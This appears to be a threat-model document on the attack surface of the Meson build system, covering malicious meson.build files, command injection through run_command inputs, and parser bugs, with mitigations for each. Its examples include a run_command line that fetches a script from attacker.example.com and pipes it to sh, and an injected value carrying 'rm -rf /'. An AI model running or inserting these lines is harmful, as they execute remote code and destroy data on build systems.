# Attack Surface Analysis for mesonbuild/meson

## Attack Surface: [Code Injection via `meson.build`](./attack_surfaces/code_injection_via__meson_build_.md)

*   **Description:** Malicious code can be injected into the build process through untrusted or compromised `meson.build` files, leveraging Meson's ability to execute arbitrary commands.
    *   **Meson Contribution:** `meson.build` files are written in a DSL that allows execution of external commands using functions like `run_command`, `custom_target`, `configure_file`, and `executable`/`shared_library`. This capability directly enables code injection if `meson.build` files are malicious.
    *   **Example:** A malicious `meson.build` file from an untrusted source contains:
        ```meson
        run_command(['wget', '-qO-', 'https://attacker.example.com/malicious_script.sh', '|', 'sh'])
        ```
        This would download and execute a script from a remote server during the build process, directly orchestrated by Meson interpreting the `meson.build` file.
    *   **Impact:** Arbitrary code execution on the build system, potentially leading to data exfiltration, system compromise, supply chain attacks, or denial of service.
    *   **Risk Severity:** **Critical**
    *   **Mitigation Strategies:**
        *   **Source Code Review:** Thoroughly review all `meson.build` files, especially those from external or untrusted sources, for suspicious commands or actions before using Meson to process them.
        *   **Input Validation:** Sanitize and validate any external inputs used within `meson.build` files before using them in commands executed by Meson.
        *   **Principle of Least Privilege:** Run the Meson build process with minimal necessary privileges to limit the impact of potential compromises.
        *   **Trusted Sources:** Only use `meson.build` files from trusted and verified sources to be processed by Meson.

## Attack Surface: [Command Injection via Unsafe Use of `run_command` and Similar Functions](./attack_surfaces/command_injection_via_unsafe_use_of__run_command__and_similar_functions.md)

*   **Description:** Improperly sanitized or validated inputs passed to Meson's command execution functions can lead to command injection vulnerabilities, allowing attackers to execute arbitrary commands on the build system through Meson.
    *   **Meson Contribution:** Meson provides functions like `run_command`, `custom_target`, `configure_file`, and `executable`/`shared_library` that take lists of strings as commands. Meson directly executes these commands. If developers construct these command lists using unsanitized external inputs within `meson.build`, Meson becomes the vehicle for command injection.
    *   **Example:** A `meson.build` file uses user-provided input without sanitization in a `run_command` call:
        ```meson
        user_provided_file = get_option('file_name')
        run_command(['cat', user_provided_file])
        ```
        If a malicious user provides input like `"file.txt; rm -rf /"` for `file_name`, Meson will execute `cat file.txt; rm -rf /`, leading to unintended command execution.
    *   **Impact:** Arbitrary command execution on the build system, potentially leading to data exfiltration, system compromise, or denial of service, all triggered by Meson's command execution.
    *   **Risk Severity:** **High**
    *   **Mitigation Strategies:**
        *   **Input Sanitization and Validation:**  Thoroughly sanitize and validate all external inputs before using them to construct commands in `meson.build` that will be executed by Meson.
        *   **Avoid Shell Expansion:** When using `run_command` and similar functions in `meson.build`, pass commands as lists of arguments to avoid shell expansion vulnerabilities when Meson executes them.
        *   **Principle of Least Privilege:** Run the Meson build process with minimal necessary privileges.
        *   **Secure Coding Practices:** Educate developers on secure coding practices within `meson.build` for Meson, emphasizing command injection risks when using Meson's command execution features.

## Attack Surface: [Parser/Interpreter Vulnerabilities in Meson Executable](./attack_surfaces/parserinterpreter_vulnerabilities_in_meson_executable.md)

*   **Description:** Bugs or vulnerabilities in the Meson parser or interpreter itself can be exploited by crafted `meson.build` files, leading to arbitrary code execution within the Meson process or denial of service.
    *   **Meson Contribution:** Meson is the tool that parses and interprets `meson.build` files. Vulnerabilities in Meson's code are directly exploited when Meson processes malicious `meson.build` files.
    *   **Example:** A hypothetical vulnerability in Meson's `meson.build` parser could be triggered by a specific syntax or construct in a `meson.build` file, causing Meson to crash or execute arbitrary code due to a bug in its parsing logic. (Specific examples would depend on discovered CVEs in Meson).
    *   **Impact:** Arbitrary code execution within the Meson process, potentially leading to build system compromise or denial of service, directly caused by exploiting Meson itself.
    *   **Risk Severity:** **High** (depending on the nature of the vulnerability, could be Critical)
    *   **Mitigation Strategies:**
        *   **Keep Meson Updated:** Regularly update Meson to the latest version to benefit from security patches and bug fixes that address vulnerabilities in Meson itself.
        *   **Report Vulnerabilities:** Report any suspected vulnerabilities in Meson to the Meson development team to help improve Meson's security.
        *   **Input Fuzzing:** Use fuzzing techniques to test Meson's parser and interpreter for vulnerabilities to proactively find issues in Meson.
        *   **Code Auditing:** Conduct security audits of the Meson codebase to identify and fix potential vulnerabilities within Meson's code.
